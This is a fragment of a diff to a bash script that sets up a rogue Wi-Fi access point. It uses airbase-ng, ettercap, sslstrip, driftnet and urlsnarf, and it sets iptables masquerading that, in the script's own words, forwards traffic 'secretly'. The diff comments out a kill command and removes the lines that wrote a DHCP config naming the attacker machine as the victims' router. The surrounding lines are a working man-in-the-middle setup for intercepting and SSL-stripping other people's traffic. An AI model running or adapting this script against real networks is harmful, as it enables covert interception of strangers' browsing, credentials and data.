@@ -6,7 +6,7 @@
 # kill all dchp, collection, and processing software
 killall -9 dhcpd3 airbase-ng ettercap sslstrip driftnet urlsnarf tail
 # Kill all dchp processes
-kill `cat /var/run/dhcp3-server/dhcpd.pid`
+#kill `cat /var/run/dhcp3-server/dhcpd.pid`
 
 read -p "Enter the name of the interface connected to the internet, for example eth0: " IFACE
 airmon-ng
@@ -46,19 +46,6 @@ iptables --table nat --delete-chain
 iptables -P FORWARD ACCEPT
 # set up new ip forwarding tables in MASQUERADE mode - forward all the things...  secretly
 iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
-
-# set up dhcp rules to forward all the things, using self as the router.
-echo Creating a dhcpd.conf to assign addresses to clients that connect to us
-echo "default-lease-time 600;" > dhcpd.conf
-echo "max-lease-time 720;" >> dhcpd.conf
-echo "ddns-update-style none;" >> dhcpd.conf
-echo "authoritative;" >> dhcpd.conf
-echo "log-facility local7;" >> dhcpd.conf
-echo "subnet 10.0.0.0 netmask 255.255.255.0 {" >> dhcpd.conf
-echo "range 10.0.0.100 10.0.0.254;" >> dhcpd.conf
-echo "option routers 10.0.0.1;" >> dhcpd.conf
-echo "option domain-name-servers 8.8.8.8;" >> dhcpd.conf
-echo "}" >> dhcpd.conf
 
 # Begin the DCHP server using the modified redirect config file
 echo 'DHCP server starting on our airdrop-ng interface (at0)'
